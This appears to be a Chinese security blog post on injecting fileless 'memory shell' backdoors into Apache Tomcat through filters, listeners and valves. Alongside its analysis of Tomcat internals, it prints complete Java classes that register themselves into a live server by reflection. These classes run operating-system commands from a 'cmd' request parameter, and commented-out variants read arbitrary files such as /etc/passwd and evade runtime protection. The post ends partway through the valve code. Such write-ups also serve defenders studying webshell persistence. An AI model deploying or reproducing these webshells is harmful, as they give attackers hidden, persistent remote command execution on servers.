---
title: "Tomcat JavaMemShell re(NO JSP)"
onlyTitle: true
date: 2025-3-8 22:56:15
categories:
- java
- 内存马
tags:
- Tomcat
- 内存马
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8136.png
---



Tomcat 内存马技术的实现依赖于`Servlet 3.0`版本之后的动态注册组件，而 Tomcat 7.x 版本才开始支持`Servlet 3.0`

# Tomcat JavaMemShell re(NO JSP)

## 内存马基础及servlet内存马

https://godownio.github.io/2025/02/25/servlet-nei-cun-ma-re

## filter内存马

在《servlet内存马re》对Tomcat从`Http11Processor.service`解析到`servlet.service`做了全流程分析。https://godownio.github.io/2025/02/25/servlet-nei-cun-ma-re/

然后在《Tomcat下获取StandardContext的方法(JSP转Java内存马)》对jsp如何转java内存马做了详细解释

其中有提到，在StandardWrapperValve.invoke中，如果servlet或者filterChain不为空，则调用filterChain.doFilter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304141102700.png)

跟进到ApplicationFilterChain.internalDoFilter内，先是把filterConfig赋为filters[]，然后filterConfig.getFilter从filterConfig内取filter，最后doFilter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304143822354.png)

所以完全可以修改filterConfig内的filter实例完成注册内存马。我们重点关注filter是怎么注册进当前环境的

向上追溯到调用ApplicationFilterFactory.createFilterChain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304141256800.png)

首先，如果参数request是Request的子类，在没有开启全局安全选项时，调用request.getFilterChain()获取当前的FilterChain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304141437180.png)

然后从当前的StandardContext内，调用findFilterMaps取出filterMaps

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304144212148.png)

接下来有两个for循环，作用如下：

* 遍历所有过滤器映射，添加与请求路径匹配的过滤器到过滤器链。
* 再次遍历所有过滤器映射，添加与Servlet名称匹配的过滤器到过滤器链。

但是不用管作用，只需要知道filterConfig通过StandardContext.findFilterConfig创建，且是用addFilter添加进filterChain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304144931783.png)

也许有的读者看到这会想，为什么不自己创建一个filterChain呢？因为filterChain是函数内部创建的变量，反射不能创建，也就影响不了后面的filterChain.doFilter

注意到以上部分都发生在createFilterChain中，而每次有http请求进来，都会调用到createFilterChain。所以可以想办法每次createFilterChain过程中addFilter添加恶意的filterConfig



因为filterConfig来自StandardContext.findFilterConfig(filterMap.getFilterName())

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304145702259.png)

跟进发现就是从静态变量filterConfigs中取出

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304145758274.png)

所以我们需要修改两个点：

* StandardContext的静态变量filterConfigs
* 参数filterMap

### 将恶意filterConfigs放进StandardContext

到这里就有很大的选择空间了，一个是自己反射改filterConfigs

另一个，因为filterConfigs是个private HashMap，在类里肯定有put的地方，查找到在filterStart

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304150027403.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304145938811.png)

可以看到filterConfigs.put的参数是name和filterConfig，而这两个参数都来自循环的中的filterDefs

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304150650767.png)

filterDefs可以用addFilterDef添加

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304150900793.png)

赋值的话，打个断点看看正常的FilterDef是什么，下面是个叫Tomcat WebSocket (JSR356) Filter 的 filterDefs

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304151517199.png)

由此可见我们需要设置三个值，所以创建恶意filterConfig并注册进standardContext的代码如下：

```java
FilterMemShell filterMemShell = new FilterMemShell();
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filterMemShell);
                filterDef.setFilterName("filterMemShell");
                filterDef.setFilterClass(filterMemShell.getClass().getName());
                standardContext.addFilterDef(filterDef);
                standardContext.filterStart();
```



### 修改参数filterMap

参数filterMap来自filterMaps

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304153335795.png)

filterMaps来自StandardContext.findFilterMaps

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304153347550.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304153416563.png)

注意到filterMaps分别有add和addBefore可以添加。首先要知道，filter是作为一个链，放到前面的filter肯定先执行。很可能有情况是前面的filter执行了然后跳出chain，从而执行不到后面的filter。所以最好调用addBefore

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304153449507.png)

也就是调用addFilterMapBefore

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304153710802.png)

同样打个断点看看filterMap具体怎么封装的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304153920750.png)

其中有几个都是初始化自带的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304155628436.png)

dispatcherMapping用setDispatcher，参数肯定是`DispatcherType.REQUEST.name()`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304155739997.png)

于是修改filterMap参数代码如下：

```java
                FilterMap filterMap = new FilterMap();
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                filterMap.setFilterName("filterMemShell");
                filterMap.addURLPattern("/*");
                standardContext.addFilterMapBefore(filterMap);
```

记得filter一定要实现Filter接口的所有方法啊，而且不要调用super！我就是只实现了doFilter，然后IDEA不报错。结果在初始化filter，调用filter.init时报AbstractMethodError，也就是直接调用了接口或抽象类的方法，super也会报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304163214352.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304163302504.png)

如下，会报错：

```java
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }
```

不要super：

```java
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
```



filter内存马JAVA TemplatesImpl版：

```java
package org.example.tomcatmemshell.Filter;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.*;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Enumeration;

public class FilterMemShell extends AbstractTranslet implements Filter {
    private String message;

    static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                //自定义StandardWrapper注册进StandardContext
                FilterMemShell filterMemShell = new FilterMemShell();
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filterMemShell);
                filterDef.setFilterName("filterMemShell");
                filterDef.setFilterClass(filterMemShell.getClass().getName());
                standardContext.addFilterDef(filterDef);
                standardContext.filterStart();
                //将恶意filterConfigs放进StandardContext

                FilterMap filterMap = new FilterMap();
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                filterMap.setFilterName("filterMemShell");
                filterMap.addURLPattern("/*");
                standardContext.addFilterMapBefore(filterMap);
                //修改参数filterMap

            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }



    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static StandardContext getStandardContext2() {
        try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
                return null;

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
                ServletResponse servletResponse = threadLocalResp.get();

                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

                System.out.println(servletRequest);
                return standardContext;
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }


    @Override
    public void destroy() {
        Filter.super.destroy();
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '\n');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        chain.doFilter
                (servletRequest, servletResponse);
    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250304165345194.png)

jsp版很好写，自己写



## listener内存马

在 Apache Tomcat 中，**Listener（监听器）**是一种用于监听特定事件（如应用程序启动、请求创建、会话销毁等）的组件。它们基于 **Servlet 规范**，允许开发者在事件发生时执行自定义逻辑，例如初始化资源、日志记录、安全检查等。

如果在Tomcat要引入listener，需要实现两种接口，分别是`LifecycleListener`和原生`EvenListener`。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308134804121.png)

实现了`LifecycleListener`接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马。

由上可知，构造内存马应该选用监听HTTP请求的`ServletRequestListener` （GPT真好用捏~）

Listener可以在web.xml配置，也可以用@WebListener注解配置

```xml
<listener>
    <listener-class>com.example.MyContextListener</listener-class>
</listener>
```

```java
@WebListener
public class MyContextListener implements ServletContextListener { ... }
```

写个demo继承 ServletRequestListener接口，用注解装配。然后在requestInitialized打上断点

```java
@WebListener("/hello-listener")
public class HelloListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("Listener 被调用");
    }

}
```

跟进到StandardHostValve.invoke，在context.bind装配完context后，调用了firstRequestInitEvent

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308141351954.png)

后面就有`context.getPipeline().getFirst().invoke(request, response)`，指向StandardWrapperValve.invoke，很显然这个invoke就会执行Filter->Servlet。所以这几个组件的执行顺序是Listener -> Filter -> Servlet

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308152936115.png)

fireRequestInitEvent中，先是调用getApplicationEventListeners获取Listener，然后强转为ServletRequestListener，然后调用其requestInitialized方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308153636748.png)

跟进到getApplicationEventListeners看看从哪获取的Listener

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308153831502.png)



有getter就有setter，直接调用addApplicationEventListener或者setter（直接修改Listeners组，容易打崩正常业务），就能完成Listener内存马的注入

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308155801951.png)

POC：

```java
package org.example.tomcatmemshell.Listener;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.example.tomcatmemshell.Filter.FilterMemShell;

import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class ListenerMemShell extends AbstractTranslet implements ServletRequestListener {
    static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                standardContext.addApplicationEventListener(new ListenerMemShell());
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}

    /**
     * Receives notification that a ServletRequest is about to come
     * into scope of the web application.
     *
     * @param sre the ServletRequestEvent containing the ServletRequest
     * and the ServletContext representing the web application
     *
     * @implSpec
     * The default implementation takes no action.
     */
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println(
                "TomcatShellInject Listener requestInitialized.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        try {
            RequestFacade servletRequest = (RequestFacade) sre.getServletRequest();
            Field requestFacade = RequestFacade.class.getDeclaredField("request");
            requestFacade.setAccessible(true);
            Request request = (Request) requestFacade.get(servletRequest);
            ServletResponse servletResponse = request.getResponse();
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static StandardContext getStandardContext2() {
        try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
                return null;

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
                ServletResponse servletResponse = threadLocalResp.get();

                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

                System.out.println(servletRequest);
                return standardContext;
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}

```



## Valve内存马

**valve**（阀门）型内存马与之前的三种内存马都不太一样，最显著的区别就是listener->filter->servlet这是一条完整的处理网络请求的流程，valve并不在这一条路上。所以Valve内存马是独属于Tomcat的内存马（比如Weblogic 、Jetty就没有）

经典老图：

![typoratomcat3](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/typoratomcat3.png)

通过之前从Http11Processor逐步分析代码可以看到

```java
Http11Protocol.service() -> getAdapter().service()获取CoyoteAdapter 
    //此时CoyoteAdapter.service将org.apache.coyoye.Request转变为普通Request对象
    
connector.getService().getContainer().getPipeline().getFirst().invoke(request, response); —> StandardEngineValve.invoke()
	//connector.getService()返回StandardService，StandardService.getContainer()返回StandardEngine，StandardEngine.getPipeline()返回StandardPipeline，StandardPipeline.getFirst()返回StandardEngineValve，下面就不列举了
    
StandardEngineValve.invoke() -> Request.getHost() (得到StandardHost) host.getPipeline().getFirst().invoke() -> StandardHostValve.invoke()
    
StandardHostValve.invoke() -> request.getContext() (得到StandardContext) context.getPipeline().getFirst().invoke() -> StandardContextValue.invoke()
    
StandardContextValue.invoke() -> request.getWrapper() (得到StandardWrapper) wrapper.getPipeline().getFirst().invoke() -> StandardWrapperValve.invoke
```

完美对应了上图。

这其中每一步都会调用到getPipeline去获取StandardPipeline

再一次跟进到connector.getService().getContainer().getPipeline()内，发现调用类为ContainerBase

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308173431658.png)

同时，根据上面的链子，StandardEngine、StandardHost、StandardContext、StandardWrapper都会调用getPipeline，很显然这四个类都继承了ContainerBase

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308211459407.png)

而每一个getPipeline之后都会调用getFirst()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308212115490.png)

这意味着，一个Pipeline里不止一条信息，如果first不为空就返回first，否则返回basic。从这里大致能猜出，每个Pipeline实际上是个链表

我们看到同样在StandardPipeline包下的一个函数addValve：

如果当前Pipeline没有Valve（first为null），则将新Valve设置为第一个，并将其next指向basic。
如果已有Valve，则遍历链表，找到最后一个Valve（其next为basic），将新Valve插入到该位置，并将其next指向basic。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308212451388.png)

所以我们可以通过addValve来添加一个自定义的valve到Pipeline，使getFirst返回它

解决了怎么添加Valve的问题，下面想在哪添加的问题。总之，内存马的构造都是解决两个问题：在哪添加，怎么添加

很显然只要能反射获取当前的StandardEngine、StandardHost、StandardContext、StandardWrapper，那么在以上任意一个组件中添加都可以

一个Valve该怎么写？看看StandardContextValve就可以了，继承了ValveBase

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308213437907.png)

ValveBase又实现了Valve接口，那自定义Valve也实现这个接口就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308223331867.png)

比如在StandardContext中添加Valve POC：

```java
package org.example.tomcatmemshell.Valve;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.Pipeline;
import org.apache.catalina.Valve;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.*;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.valves.ValveBase;
import org.example.tomcatmemshell.Listener.ListenerMemShell;

import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class ValveMemShell1 extends AbstractTranslet implements Valve {
    @Override
    public Valve getNext() {
        return null;
    }

    @Override
    public void setNext(Valve valve) {

    }

    @Override
    public void backgroundProcess() {

    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject Valve invoke.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        try {
            if ((cmd = request.getParameter(cmdParamName)) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
                return;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }

    static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                Pipeline standardPipeline = standardContext.getPipeline();
                Valve[] valves = standardPipeline.getValves();
                boolean hasValveShell = false;
                Valve valveShell = new ValveMemShell1();
                for (Valve valve : valves) {
                    // 在这里对每个valve进行操作
                    if (valve.getClass().equals(valveShell.getClass())) {
                        hasValveShell = true;
                        break;
                    }
                }
                if (!hasValveShell) {
                    standardPipeline.addValve(valveShell);
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
